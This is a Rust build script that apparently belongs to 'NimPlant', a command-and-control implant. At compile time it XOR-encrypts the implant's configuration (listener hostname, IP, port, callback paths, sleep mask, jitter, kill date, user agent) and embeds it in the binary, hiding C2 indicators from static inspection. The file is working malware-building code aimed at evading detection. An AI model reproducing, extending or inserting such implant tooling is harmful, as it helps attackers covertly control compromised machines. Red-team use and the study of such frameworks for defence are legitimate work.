extern crate bincode;

use serde::{Deserialize, Serialize};
use std::{
    env,
    error::Error,
    fs::File,
    io::{BufWriter, Write},
    path::Path,
};

#[derive(Serialize, Deserialize, PartialEq, Debug, Clone)]
struct Config {
    listener: Listener,
    nimplant: NimPlant,
}

#[allow(non_snake_case)]
#[derive(Serialize, Deserialize, PartialEq, Debug, Clone)]
struct Listener {
    #[serde(rename = "type")]
    l_type: String,
    hostname: String,
    ip: String,
    port: u32,
    registerPath: String,
    taskPath: String,
    resultPath: String,
}

#[allow(non_snake_case)]
#[derive(Serialize, Deserialize, PartialEq, Debug, Clone)]
struct NimPlant {
    riskyMode: bool,
    sleepMask: bool,
    sleepTime: u32,
    sleepJitter: f64,
    killDate: String,
    userAgent: String,
}

#[derive(Serialize)]
enum ConfigKey {
    ListenerType,
    ListenerHostname,
    ListenerIP,
    ListenerPort,
    ListenerRegisterPath,
    ListenerTaskPath,
    ListenerResultPath,
    NimPlantRiskyMode,
    NimPlantSleepMask,
    NimPlantSleepTime,
    NimPlantSleepJitter,
    NimPlantKillDate,
    NimPlantUserAgent,
}

fn xor(s: &[u8], key: i64) -> Vec<u8> {
    let mut k = key;
    let mut result: Vec<u8> = vec![];

    for byte in s {
        let mut character: u8 = *byte;

        for m in &[0, 8, 16, 24] {
            let value = ((k >> m) & 0xFF) as u8;

            character ^= value;
        }

        result.push(character);
        k += 1;
    }

    result
}

fn main() -> Result<(), Box<dyn Error>> {
    let out_dir = env::var("OUT_DIR")?;

    // Write XOR Key
    let raw_xor_key = include_str!("../.xorkey");
    let xor_key = raw_xor_key
        .parse::<i64>()
        .map_err(|_| "Failed to parse .xorkey file")?;
    let xor_dest_path = Path::new(&out_dir).join("xor_key.rs");
    let mut xor_file = BufWriter::new(File::create(xor_dest_path)?);

    write!(xor_file, "{xor_key}")?;

    // Only get what we need from config.toml
    let raw_contents = include_bytes!("../config.toml");
    let contents =
        std::str::from_utf8(raw_contents).map_err(|_| "Failed to convert config to string")?;
    let c: Config = toml::from_str(contents).map_err(|_| "Failed to parse config")?;

    // Write config as a Vector of encrypted items
    let config = vec![
        (
            ConfigKey::ListenerType,
            xor(c.listener.l_type.as_bytes(), xor_key),
        ),
        (
            ConfigKey::ListenerHostname,
            xor(c.listener.hostname.as_bytes(), xor_key),
        ),
        (
            ConfigKey::ListenerIP,
            xor(c.listener.ip.as_bytes(), xor_key),
        ),
        (
            ConfigKey::ListenerPort,
            xor(c.listener.port.to_string().as_bytes(), xor_key),
        ),
        (
            ConfigKey::ListenerRegisterPath,
            xor(c.listener.registerPath.as_bytes(), xor_key),
        ),
        (
            ConfigKey::ListenerTaskPath,
            xor(c.listener.taskPath.as_bytes(), xor_key),
        ),
        (
            ConfigKey::ListenerResultPath,
            xor(c.listener.resultPath.as_bytes(), xor_key),
        ),
        (
            ConfigKey::NimPlantRiskyMode,
            xor(c.nimplant.riskyMode.to_string().as_bytes(), xor_key),
        ),
        (
            ConfigKey::NimPlantSleepMask,
            xor(c.nimplant.sleepMask.to_string().as_bytes(), xor_key),
        ),
        (
            ConfigKey::NimPlantSleepTime,
            xor(c.nimplant.sleepTime.to_string().as_bytes(), xor_key),
        ),
        (
            ConfigKey::NimPlantSleepJitter,
            xor(c.nimplant.sleepJitter.to_string().as_bytes(), xor_key),
        ),
        (
            ConfigKey::NimPlantKillDate,
            xor(c.nimplant.killDate.as_bytes(), xor_key),
        ),
        (
            ConfigKey::NimPlantUserAgent,
            xor(c.nimplant.userAgent.as_bytes(), xor_key),
        ),
    ];
    let encoded = bincode::serialize(&config).unwrap();

    let config_dest_path = Path::new(&out_dir).join("_config.rs");
    let mut config_file = BufWriter::new(File::create(config_dest_path)?);
    config_file.write_all(&encoded)?;

    // Rerun if this file, the config file or the XOR key change
    println!("cargo:rerun-if-changed=build.rs,../config.toml,../.xorkey");

    Ok(())
}
